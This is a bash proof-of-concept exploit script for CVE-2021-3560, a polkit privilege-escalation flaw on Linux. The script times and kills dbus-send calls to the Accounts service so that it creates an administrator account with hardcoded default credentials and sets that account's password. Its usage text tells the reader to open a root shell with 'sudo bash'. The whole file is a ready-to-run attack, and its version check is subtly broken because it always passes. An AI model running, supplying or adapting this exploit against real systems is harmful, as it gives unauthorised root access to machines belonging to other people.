#!/bin/bash

$USR
$PASS
$TIME
$FORCE

# Argparse
function usage(){
    echo "CVE-2021-3560 Polkit v0.105-26 Linux Privilege Escalation PoC by SecNigma"
    echo ""
    echo "Original research by Kevin Backhouse"
    echo "https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#vulnerability"
    echo ""
    echo "USAGE:"
    echo "./poc.sh"
    echo -e "\t-h --help"
    echo -e "\t-u=Enter custom username to insert (OPTIONAL)"
    echo -e "\t-p=Enter custom password to insert (OPTIONAL)"
    echo -e "\t-f=y, To skip vulnerability check and force exploitation. (OPTIONAL)"
    echo -e "\t-t=Enter custom sleep time, instead of automatic detection (OPTIONAL)"
    echo -e "\tFormat to enter time: '-t=.004' if you want to set sleep time as 0.004ms "
    echo -e "Note:"
    echo -e "Equal to symbol (=) after specifying an option is mandatory."
    echo -e "If you don't specify the options, then the script will automatically detect the possible time and"
    echo -e "will try to insert a new user using that time."
    echo -e "Default credentials are 'secnigma:secnigmaftw'"
    echo -e "If the exploit ran successfully, then you can login using 'su - secnigma'"
    echo -e "and you can spawn a bash shell as root using 'sudo bash'"
    echo -e ""
}

while [ "$1" != "" ]; do
    PARAM=`echo $1 | awk -F= '{print $1}'`
    VALUE=`echo $1 | awk -F= '{print $2}'`
    case $PARAM in
        -h | --help)
            usage
            exit
            ;;
        -u)
            USR=$VALUE
            ;;
        -p)
            PASS=$VALUE
            ;;
        -t)
            TIME=$VALUE
            ;;
        -f)
            FORCE=$VALUE
            ;;
        *)
            echo "ERROR: unknown parameter \"$PARAM\""
            usage
            exit 1
            ;;
    esac
    shift
done

echo "user is $USR";
echo "pass is $PASS";
echo "timing is $TIME";
echo "force is $FORCE";









if  [[ $USR ]];then
	username=$(echo $USR)
else
	username="secnigma"
fi
if  [[ $PASS ]];then
	password=$(echo $PASS)
else

	password="secnigmaftw"
fi



t=""
timing_int=""
uid=""

function check_installed(){
	name=$(echo $1)
	out=$(dpkg -l | grep -i $name|grep -i "query and manipulate user account information\|utilities to configure the GNOME desktop")
	echo $out
}

function check_polkit(){
	out=$(dpkg -l | grep -i polkit|grep -i "0.105-26")
	echo $out
}

function float_to_int(){
	floating=$(echo $1)
	temp_val=$(echo ${floating:1:$((${#floating}))}) # Remove point
	exp="`echo $temp_val`/1"
	temp_val=$(bc -l <<< $exp)
	val=${temp_val%.*}
	echo $val
	
}

function inc_float(){
	floating=$(echo $1)
	int_val=$(float_to_int $floating)
	val=$(echo $floating | sed -e 's/'`echo $int_val`'/'`expr $int_val + 1`'/g')
	echo $val
}

function dec_float(){
	floating=$(echo $1)
	int_val=$(float_to_int $floating)
	val=$(echo $floating | sed -e 's/'`echo $int_val`'/'`expr $int_val - 1`'/g')
	echo $val
}


function insert_user(){
	# Assign new fd for error capture
	exec 3>&1 4>&2 
	# Fetching the timing
	out=$( { time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:`echo $username` string:"`echo $username`" int32:1 2>&1 >/dev/null 2>&4 1>&3; } 2>&1 )
	tmp=$(echo $out |grep -i "real"|awk -F '.' '{print $2}')
	tmp_timing=$(echo ${tmp:0:$((${#tmp}-10))})
	exec 3>&- 4>&- # release the extra file descriptors
	
	ex="0.`echo $tmp_timing`/2"
	tmp2=$(bc -l <<< $ex);
	timing=$(echo ${tmp2:0:$((${#tmp2}-17))})
	timing_int=$(expr $tmp_timing / 2)
	
	temp_count=$(inc_float `echo $timing`)
	count=$(float_to_int $temp_count)
	
	if [[ $TIME ]]; then
		t=$(echo $TIME)
	else
		t=$(echo $timing)
	fi

for i in $(seq 1  $count|sort -r)
do
	if id `echo $username` >/dev/null;
	then
               uid=$(id `echo $username`|cut -d = -f2|cut -d \( -f1)
		echo $uid","$t
		break
	else
		dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:`echo $username` string:"`echo $username`" int32:1 & sleep 0`echo $t`s ; kill $!
	fi

done

}



function insert_pass(){
	ti=$(echo $t)
	u_id=$(echo $uid)
	hash1=$(openssl passwd -5 `echo -n $password`)
	temp_count=$(inc_float `echo $ti`)
	count=$(float_to_int $temp_count)
	time=$(echo $ti)
	for i in $(seq 1 $count|sort -r)
	do
		dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User`echo $u_id` org.freedesktop.Accounts.User.SetPassword string:`echo -n $hash1` string:GoldenEye & sleep 0`echo $ti`s ; kill $!
done
return 1

}

function exploit(){
			echo "[!] Starting exploit..."
			echo "[!] Inserting Username `echo $username`..."

			ret=$(insert_user)
			t=$(echo $ret|cut -d , -f2)
			uid=$(echo $ret|cut -d , -f1)
			#exit

			if [[ $uid -gt 0  ]]; then
				echo "[+] Inserted Username `echo $username`  with UID `echo $uid`!"
				echo $t
				echo $uid
				echo "[!] Inserting password hash..."
				echo $timing
				insert_pass $timing $uid
				ret=$(insert_pass $timing $uid)
				if [[ "$ret" -ne "1" ]]; then
					echo "[!] It seems like the password insertion is succesful!"
					echo "[!] Try to login as the injected user using sudo - `echo $username`"
					echo "[!] When prompted for password, enter your password "
					echo "[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!"
				else
					echo "[!] It seems like the password injection FAILED!"
					echo "[!]  Aborting Execution!"
					echo "[!]  Usually multiple attempts are required to get the timing right. Try running the exploit again."
					echo "[!]  If the exploit doesn't work after several tries, then you may have to exploit this manually."
					
				fi
					
					
			else
				echo "[x] Insertion of Username failed!"
				echo "[!]  Aborting Execution!"
				echo "[!]  Usually multiple attempts are required to get the timing right. Try running the exploit again."
				echo "[!]  If the exploit doesn't work after several tries, then you may have to exploit this manually."
			fi 

}

if [[ "$FORCE" == "y" ]]; then 
	exploit

else

	echo "[!] Checking if Accountsservice and Gnome-Control-Center is installed"
	ac_service=$(check_installed $(echo "accountsservice"))
	gc_center=$(check_installed $(echo "gnome-control-center"))


	if [[ $ac_service && $gc_center ]]
	then
		echo "[+] Accounts service and Gnome-Control-Center Installation Found!!"
		echo "[!] Checking if polkit version is vulnerable"
		polkit=$(check_polkit)
		if [[ polkit ]]
		then
			echo "[+] Polkit version appears to be vulnerable!!"
			exploit
		else
			echo "[x] ERROR: Polkit version does not appears to be vulnerable!!"
			echo "[!]  Aborting Execution!"
		fi


		
	else
		echo "[x] ERROR: Accounts service and Gnome-Control-Center NOT found!!"
		echo "[!]  Aborting Execution!"
	fi
fi
